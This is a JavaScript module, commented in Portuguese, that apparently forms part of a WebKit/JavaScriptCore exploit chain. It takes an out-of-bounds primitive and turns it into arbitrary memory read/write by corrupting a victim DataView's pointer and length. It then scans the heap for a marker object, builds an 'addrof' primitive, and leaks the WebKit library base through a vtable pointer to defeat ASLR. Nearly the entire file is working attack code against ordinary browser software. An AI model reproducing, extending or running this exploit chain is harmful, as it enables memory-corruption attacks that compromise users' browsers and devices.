// js/script3/testArrayBufferVictimCrash.mjs (v17 - CORREÇÃO FINAL E CADEIA COMPLETA)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { triggerOOB_primitive, getOOBDataView, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_to_ROP_COMPLETE_CHAIN_v17_Final";

// --- Constantes, Offsets e Funções Auxiliares ---
const OOB_DV_METADATA_BASE = 0x58;
const M_VECTOR_OFFSET_IN_DV = 0x10;
const M_LENGTH_OFFSET_IN_DV = 0x18;
const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x200;
const VICTIM_DV_POINTER_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_VECTOR_OFFSET_IN_DV;
const VICTIM_DV_LENGTH_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_LENGTH_OFFSET_IN_DV;
const JS_OBJECT_BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
const JSFunction_executable_offset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
const Structure_vtable_offset_put = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;

function isValidPointer(ptr, context = '') {
    if (!ptr) return false;
    const ptrBigInt = ptr instanceof AdvancedInt64 ? ptr.toBigInt() : BigInt(ptr);
    if (ptrBigInt === 0n) return false;
    const validRange = (ptrBigInt >= 0x100000000n && ptrBigInt < 0x10000000000n);
    if (!validRange) {
        logS3(`[isValidPointer - ${context}] Falha: ponteiro 0x${ptrBigInt.toString(16)} está fora da faixa esperada.`, "warn");
    }
    return validRange;
}

// =======================================================================================
// FUNÇÃO DE ATAQUE FINAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };
    
    try {
        // --- FASE 1: Construção das Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- Fase 1: Construindo Primitivas de R/W ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        let victim_dv = new DataView(new ArrayBuffer(4096));

        const arb_read_64 = (address) => {
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
            return new AdvancedInt64(victim_dv.getUint32(0, true), victim_dv.getUint32(4, true));
        };
        const arb_write_64 = (address, value64) => {
            const val = value64 instanceof AdvancedInt64 ? value64 : new AdvancedInt64(value64);
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
            victim_dv.setBigUint64(0, val.toBigInt(), true);
        };
        logS3("    Primitivas de Leitura/Escrita (R/W) funcionais.", "vuln");

        // --- FASE 2: Escaneamento de Memória para Info Leak ---
        logS3("--- Fase 2: Escaneamento de Memória para Vazamento de Endereço ---", "subtest");
        let leaker_obj = { butterfly: 0n, marker: 0x4142434445464748n };
        let leaker_obj_addr = null;
        
        const HEAP_SCAN_REGIONS = [0x2000000000n, 0x1800000000n, 0x2800000000n];
        const SCAN_RANGE_PER_REGION = 0x2000000;

        search_loop: for (const start_addr of HEAP_SCAN_REGIONS) {
            logS3(`    Escaneando a região a partir de 0x${start_addr.toString(16)}...`, "info");
            for (let i = 0; i < SCAN_RANGE_PER_REGION; i += 8) {
                let current_addr = start_addr + BigInt(i);
                if (arb_read_64(current_addr).toBigInt() === leaker_obj.marker) {
                    leaker_obj_addr = current_addr - BigInt(JS_OBJECT_BUTTERFLY_OFFSET);
                    logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: ${leaker_obj_addr.toString(16)}`, "leak");
                    break search_loop;
                }
            }
        }
        if (!leaker_obj_addr) throw new Error("Escaneamento agressivo falhou.");

        // --- FASE 3: Construção da Primitiva 'addrof' e Vazamento da Base ---
        logS3("--- Fase 3: Construindo 'addrof' e Vazando a Base do WebKit ---", "subtest");
        const butterfly_addr = leaker_obj_addr.add(JS_OBJECT_BUTTERFLY_OFFSET);

        const addrof_primitive = (obj) => {
            leaker_obj.butterfly = obj; // Anexa o objeto para que o GC não o colete
            arb_write_64(butterfly_addr, obj); // Escreve o objeto na propriedade do leaker
            return arb_read_64(butterfly_addr); // Lê o endereço de volta
        };
        logS3("    Primitiva 'addrof' REAL construída com sucesso!", "vuln");

        const target_func = () => {};
        const target_addr = addrof_primitive(target_func);
        if (!isValidPointer(target_addr, 'addrof')) throw new Error(`Falha ao obter endereço válido com 'addrof': ${target_addr.toString(true)}`);
        
        const ptr_to_exec = arb_read_64(target_addr.add(JSFunction_executable_offset));
        if (!isValidPointer(ptr_to_exec, 'ptr_to_exec')) throw new Error("Ponteiro para Executable inválido.");
        
        const structure_addr = arb_read_64(target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
        const vtable_ptr = arb_read_64(structure_addr.add(Structure_vtable_offset_put));
        if (!isValidPointer(vtable_ptr, 'vtable_ptr')) throw new Error("Ponteiro para VTable inválido.");
        
        const vtable_known_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        const webkit_base = vtable_ptr.sub(vtable_known_offset);
        logS3(`    SUCESSO! Base do WebKit encontrada: ${webkit_base.toString(true)}`, "vuln");

        final_result = { success: true, message: `Exploit bem-sucedido. Base do WebKit em ${webkit_base.toString(true)}` };
        logS3(`    ${final_result.message}`, "vuln");

    } catch (e) {
        final_result.message = `ERRO na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
